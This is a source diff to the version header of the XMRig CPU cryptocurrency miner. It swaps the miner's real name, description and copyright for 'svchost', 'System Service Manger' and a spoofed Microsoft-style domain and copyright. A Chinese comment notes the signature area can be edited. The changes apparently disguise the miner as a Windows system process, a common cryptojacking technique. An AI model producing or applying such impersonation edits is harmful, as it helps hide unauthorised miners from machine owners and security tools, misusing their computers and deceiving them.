@@ -24,18 +24,20 @@
 #ifndef __VERSION_H__
 #define __VERSION_H__
 
-#define APP_ID        "xmrig"
-#define APP_NAME      "XMRig"
-#define APP_DESC      "XMRig CPU miner"
-#define APP_VERSION   "2.3.1"
-#define APP_DOMAIN    "xmrig.com"
-#define APP_SITE      "www.xmrig.com"
-#define APP_COPYRIGHT "Copyright (C) 2016-2017 xmrig.com"
+//这里是文件署名信息区,可以修改
 
-#define APP_VER_MAJOR  2
-#define APP_VER_MINOR  3
+#define APP_ID        "svchost"
+#define APP_NAME      "svchost"
+#define APP_DESC      "System Service Manger"
+#define APP_VERSION   "v0.1"
+#define APP_DOMAIN    "MICR0$0FT.com"
+#define APP_SITE      "www.MICR0$0FT.com"
+#define APP_COPYRIGHT "Copyright (C) 2016-2017 M$"
+
+#define APP_VER_MAJOR  0
+#define APP_VER_MINOR  1
 #define APP_VER_BUILD  1
-#define APP_VER_REV    0
+#define APP_VER_REV    beta
 
 #ifdef _MSC_VER
 #   if _MSC_VER == 1910
